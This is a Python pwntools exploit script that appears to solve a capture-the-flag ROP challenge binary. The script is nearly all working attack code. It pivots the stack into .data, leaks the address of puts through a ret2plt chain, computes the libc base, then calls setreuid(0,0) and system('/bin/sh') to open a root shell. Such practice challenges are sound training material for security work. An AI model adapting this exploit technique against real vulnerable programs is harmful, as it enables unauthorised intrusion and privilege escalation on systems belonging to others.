### idea: ret2plt, stack pivoting

from pwn import *

context.arch = 'amd64'

elf = ELF('/challenge/babyrop_level9.0')
pivot_rop = ROP(elf)
leak_rop = ROP(elf)

pop_rdi = pivot_rop.rdi.address
new_rsp = 0x4140e0 + 0x10 # .data, not randomized. the first 2 will be pop rsp gadget and the new rsp addr
new_rbp = 0x4140e0 + 0x1000 # the whole buffer
pop_rsp = 0x4014b4 # pop rsp ; pop r13 ; pop rbp ; ret ;
ret = pivot_rop.ret.address

puts_plt = elf.plt.puts
puts_got = elf.got.puts
start = elf.sym['_start']

p = process(["/challenge/babyrop_level9.0"])
#padding = b"A" * (0x60 + 8) # no padding in this chall

# stack pivoting
pivot_rop.raw(pop_rsp)
pivot_rop.raw(new_rsp)
pivot_rop.raw(0x00) # r13, dummy
pivot_rop.raw(new_rbp)

# leak puts@got addr
leak_rop.raw(pop_rdi)
leak_rop.raw(puts_got)
leak_rop.raw(puts_plt)
leak_rop.raw(start)

#payload = padding + rop.chain() # no padding in this chall
payload = pivot_rop.chain() + leak_rop.chain()

p.send(payload)
p.recvuntil(b"Leaving!\n")
puts_addr = unpack(p.recvuntil(b"\n")[:-1], 'all')

# get libc base addr
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc.address = puts_addr - libc.symbols['puts']

# system("/bin/sh")
bin_sh = next(libc.search(b'/bin/sh'))
libc_rop = ROP(libc)
libc_rop.setreuid(0, 0)  # equivalent to rop.call(libc.setreuid, [0, 0])
libc_rop.raw(ret)
libc_rop.system(bin_sh)  # equivalent to rop.call(libc.system, [bin_sh])

payload = pivot_rop.chain() + libc_rop.chain()

p.send(payload)

p.interactive()
